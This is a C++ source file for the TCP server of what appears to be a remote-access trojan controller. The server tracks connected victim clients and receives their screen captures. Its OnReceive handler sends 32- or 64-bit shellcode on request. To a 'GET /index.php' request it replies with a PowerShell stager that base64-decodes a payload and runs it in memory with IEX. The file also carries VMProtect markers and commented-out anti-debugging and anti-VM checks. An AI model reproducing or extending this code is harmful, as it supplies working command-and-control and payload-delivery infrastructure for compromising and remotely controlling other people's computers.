#include "stdafx.h"
#include "HpTcpServer.h"
extern unsigned char* powershellLogin;


CHpTcpServer::CHpTcpServer(void) :m_TcpServer(this)
{
	B_run = TRUE;
	TRACE("CHpTcpServer\r\n");
	//InitializeCriticalSection(&m_cs);
}


CHpTcpServer::~CHpTcpServer(void)
{
	Shutdown();
	if (m_TcpServer->GetState() != SS_STOPPED)
		m_TcpServer->Stop();
	while (m_TcpServer->GetState() != SS_STOPPED)
	{
		Sleep(300);
	}
	//DeleteCriticalSection(&m_cs);
}

BOOL CHpTcpServer::Initialize(NOTIFYPROC pNotifyProc, int nMaxConnections, TCHAR* ip, int nPort)
{
	int itnnum = 99;
	VMPSTAR
	m_TcpServer->SetMaxConnectionCount(ONLINE_NUM*2);
	m_maxConnection = nMaxConnections;
	m_TcpServer->SetSendPolicy(SP_DIRECT);
	m_TcpServer->SetNoDelay(TRUE);
	m_TcpServer->SetOnSendSyncPolicy(OSSP_RECEIVE);
	m_pNotifyProc = pNotifyProc;
#ifndef _DEBUG
	itnnum = 4;
	// CHECK_PROTECTION(itnnum, 4);		//检查破解
	// CHECK_DEBUGGER(itnnum, 4);			//检查调试
	// CHECK_CODE_INTEGRITY(itnnum, 4);	//检查补丁
	// CHECK_REGISTRATION(itnnum, 4);		//检查是否注册
	// CHECK_VIRTUAL_PC(itnnum, 4);		//VMWare/VirtualPC
#else
	itnnum = 4;
#endif

	_tcscpy_s(m_ip, ip);
	m_port = nPort;
	m_stop = FALSE;
	m_headerlength = itnnum + 10;
	VMPEND
		return m_TcpServer->Start(_T("0.0.0.0"), nPort);

}

EnHandleResult CHpTcpServer::OnPrepareListen(ITcpServer* pSender, SOCKET soListen)
{
	TRACE("%s  OnPrepareListenr\n", __FUNCTION__);
	SYS_SSO_SendBuffSize(soListen, MAX_SEND_BUFFER);
	SYS_SSO_RecvBuffSize(soListen, MAX_RECV_BUFFER);
	return HR_OK;
}

EnHandleResult CHpTcpServer::OnAccept(ITcpServer* pSender, CONNID dwConnID, UINT_PTR soClient)
{
	TRACE("%s   OnAccept--%d\r\n", __FUNCTION__, dwConnID);
	if (!B_run)return HR_ERROR;
	ClientContext* pContext = NULL;
	//EnterCriticalSection(&m_cs);
	m_clcs.lock();
	if (!m_listFreePool.IsEmpty())
	{
		pContext = m_listFreePool.RemoveHead();
	}
	else
	{
		pContext = new(std::nothrow) ClientContext;
	}
	m_clcs.unlock();
	//LeaveCriticalSection(&m_cs);
	if (pContext == NULL) 	return HR_ERROR;

	ZeroMemory(pContext, sizeof(ClientContext));
	pContext->m_bIsMainSocket = FALSE;
	memset(pContext->m_Dialog, 0, sizeof(pContext->m_Dialog));
	pContext->pView = NULL;
	pContext->m_Socket = dwConnID;
	pContext->switchsocket = tcp;
	pContext->m_server = this;
	pContext->LoginInfo = NULL;
	pContext->ScreenPicture = NULL;
	pContext->PictureSize = 0;
	pContext->IsConnect = 666;
	pContext->m_bIsSys = FALSE;
	int iAddressLen = sizeof(pContext->szAddress) / sizeof(TCHAR);
	pSender->GetRemoteAddress(dwConnID, pContext->szAddress, iAddressLen, pContext->usPort);
	_tcscpy_s(pContext->m_ip, m_ip);
	pContext->m_port = m_port;
	if (!m_TcpServer->SetConnectionExtra(dwConnID, pContext))
		return HR_ERROR;
	return HR_OK;
}

EnHandleResult CHpTcpServer::OnSend(ITcpServer* pSender, CONNID dwConnID, const BYTE* pData, int iLength)
{
	//TRACE("%s OnSend--%d\r\n", __FUNCTION__, dwConnID);

	return HR_OK;
}


EnHandleResult CHpTcpServer::OnReceive(ITcpServer* pSender, CONNID dwConnID, int iLength)
{
	TRACE("%s OnReceive--%d\r\n", __FUNCTION__, dwConnID);

	ClientContext* pContext = NULL;
	if((!m_TcpServer->GetConnectionExtra(dwConnID, (PVOID*)&pContext)) && (pContext != nullptr)  && (iLength <= 0))
		return HR_ERROR;

	if (pContext->IsConnect!=666) return HR_ERROR;
	PBYTE pData = new BYTE[iLength];
	m_TcpServer->Fetch(dwConnID, pData, iLength);
	pContext->m_CompressionBuffer.Write((PBYTE)pData, iLength);
	//发送shellcode
	if (iLength == 3)
	{
		if (memcmp((char*)pData, "32", 2) == 0)
		{
			m_pNotifyProc(pContext, NC_SEND_SHELCODE_32);
			SAFE_DELETE_AR(pData);
			return HR_OK;
		}
		if (memcmp((char*)pData, "64", 2) == 0)
		{
			m_pNotifyProc(pContext, NC_SEND_SHELCODE_64);
			SAFE_DELETE_AR(pData);
			return HR_OK;
		}
	}
	if (memcmp(pData, "GET /index.php HTTP/1.1", 23) == 0)
	{
		if (powershellLogin == NULL)
		{
			MessageBox(0, _T("powershell无数据，需要生成下"), 0, 0);
			SAFE_DELETE_AR(pData);
			return HR_ERROR;
		}
		CStringA str;
		str.Format("HTTP/1.1 200 OK\r\nContent-type: text/plain\r\nContent-Length:%d\r\n\r\n$bhyy=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"%s\"));IEX (New-Object IO.StreamReader($bhyy)).ReadToEnd();", strlen((char*)powershellLogin) + 126, powershellLogin);
		pContext->m_WriteBuffer.Write((PBYTE)str.GetBuffer(), str.GetLength());
		SendWithSplit(pContext->m_Socket, pContext->m_WriteBuffer.GetBuffer(), pContext->m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
		pContext->m_WriteBuffer.ClearBuffer();
		SAFE_DELETE_AR(pData);
		return HR_ERROR;
	}

	SAFE_DELETE_AR(pData);
	m_pNotifyProc(pContext, NC_RECEIVE);

	// 检测数据大小
	while ((int)pContext->m_CompressionBuffer.GetBufferLen() > m_headerlength)
	{
		if (pContext->m_password[8] != TOKEN_ACTIVED)
		{

			for (size_t i = 0; i < 9; i++)
			{
				if (pContext->m_password[i] != 0)
					return HR_ERROR;
			}
			memcpy(pContext->m_password, pContext->m_CompressionBuffer.GetBuffer(4), 10);
			(pContext->m_password[9] == 1) ? (pContext->bisx86 = FALSE) : (pContext->bisx86 = TRUE);
		}
		int nSize = 0;
		CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(0), sizeof(int));
		if ((nSize>0) && (((int)pContext->m_CompressionBuffer.GetBufferLen()) >= nSize))
		{
			if  ((int)pContext->m_CompressionBuffer.GetBufferLen() < nSize)
			{
				TRACE("%s %d  memcmp  baddata \r\n", __FUNCTION__, dwConnID);
				return HR_ERROR;
			}
			try
			{
			pContext->m_allpack_rev++;
			pContext->m_alldata_rev += nSize;
			pContext->m_DeCompressionBuffer.ClearBuffer();								//清理旧数据
			if (pContext->m_password[8] != TOKEN_ACTIVED)
				return HR_ERROR;
			pContext->m_DeCompressionBuffer.Write(pContext->m_CompressionBuffer.GetBuffer(m_headerlength), nSize - m_headerlength, 1, pContext->m_password);	//写入数据
			m_pNotifyProc(pContext, NC_RECEIVE_COMPLETE);
			pContext->m_CompressionBuffer.Delete(nSize);						//清理剩下数据
			}
			catch (...)
			{
				return HR_ERROR;
			}
		}
		else
			break;
	}
	return HR_OK;

}

EnHandleResult CHpTcpServer::OnClose(ITcpServer* pSender, CONNID dwConnID, EnSocketOperation enOperation, int iErrorCode)
{
	TRACE("%s  %d---%d\r\n", __FUNCTION__, dwConnID, iErrorCode);
	ClientContext* pContext = NULL;
	if (m_TcpServer->GetConnectionExtra(dwConnID, (PVOID*)&pContext) && pContext != nullptr)
		m_TcpServer->SetConnectionExtra(dwConnID, NULL);
	if (!pContext)  return HR_OK;
	pContext->IsConnect = 888;
	m_pNotifyProc(pContext, NC_CLIENT_DISCONNECT);
	MovetoFreePool(pContext);
	return HR_OK;
}

void CHpTcpServer::MovetoFreePool(ClientContext* pContext)
{
	if (pContext->PictureSize != 0)
	{
		pContext->PictureSize = 0;
		SAFE_DELETE_AR(pContext->ScreenPicture);
	}
	pContext->pView = NULL;
	pContext->m_bIsMainSocket = FALSE;
	pContext->m_CompressionBuffer.FreeBuffer();
	pContext->m_WriteBuffer.FreeBuffer();
	pContext->m_DeCompressionBuffer.FreeBuffer();
	//EnterCriticalSection(&m_cs);
	m_clcs.lock();
	m_listFreePool.AddTail(pContext);
	m_clcs.unlock();
	//LeaveCriticalSection(&m_cs);
}

EnHandleResult CHpTcpServer::OnShutdown(ITcpServer* pSender)
{
	TRACE("%s OnShutdown\r\n", __FUNCTION__);
	return HR_OK;
}




void CHpTcpServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize)
{

	//	TRACE("%s Send \r\n", __FUNCTION__);
	if (pContext == NULL) 	return;
	if (pContext->IsConnect!=666) return;
	if (nSize > 0&&B_run)
	{
		pContext->m_allpack_send++;
		pContext->m_alldata_send += nSize;
		LONG nBufLen = nSize + m_headerlength;
		pContext->m_WriteBuffer.Write((PBYTE)&nBufLen, 4);			//总数据长度 4位
		pContext->m_WriteBuffer.Write((PBYTE)pContext->m_password, 10);				//通信密码 
		pContext->m_WriteBuffer.Write(lpData, nSize, 1, pContext->m_password);		//数据
		SendWithSplit(pContext->m_Socket, pContext->m_WriteBuffer.GetBuffer(), pContext->m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
		pContext->m_WriteBuffer.ClearBuffer();
	}
}


BOOL CHpTcpServer::SendWithSplit(CONNID dwConnID, LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int nSend = 0;
	UINT nSendRetry = 0;
	if (nSize >= nSplitSize)
	{
		UINT i = 0;
		nSendRetry = nSize / nSplitSize;
		for (i = 0; i < nSendRetry; i++)
		{
			BOOL rt = m_TcpServer->Send(dwConnID, lpData, nSplitSize);
			if (rt == FALSE)
			{
				return FALSE;
			}
			lpData += nSplitSize;
			nSend += nSplitSize;
		}
		if (nSize - nSend < nSplitSize)
		{
			if (nSize - nSend > 0)
			{
				BOOL rt = m_TcpServer->Send(dwConnID, lpData, nSize - nSend);
			}
		}
	}
	else
	{
		BOOL rt = m_TcpServer->Send(dwConnID, lpData, nSize);
	}
	return  TRUE;


}


void CHpTcpServer::Shutdown()
{
	if (B_run == FALSE)
		return;
	B_run = FALSE;
	CONNID pIDs[65535] = { 0 };
	DWORD dwCount = 65535;
	BOOL status = m_TcpServer->GetAllConnectionIDs(pIDs, dwCount);
	if (status && (dwCount > 0))
	{
		for (DWORD i = 0; i < dwCount; i++)
		{
			Disconnect(pIDs[i]);
		}
	}
	m_TcpServer->Stop();
	m_clcs.lock();
	while (!m_listFreePool.IsEmpty())
		delete m_listFreePool.RemoveTail();
	m_clcs.unlock();

}



BOOL CHpTcpServer::Disconnect(CONNID dwConnID)
{
	m_TcpServer->Disconnect(dwConnID);
	return 0;
}

BOOL CHpTcpServer::IsConnected(CONNID dwConnID)
{
	return	m_TcpServer->IsConnected(dwConnID);
}

BOOL CHpTcpServer::IsOverMaxConnectionCount()
{
	return (m_TcpServer->GetConnectionCount() > (DWORD)m_maxConnection) ? TRUE : FALSE;
}

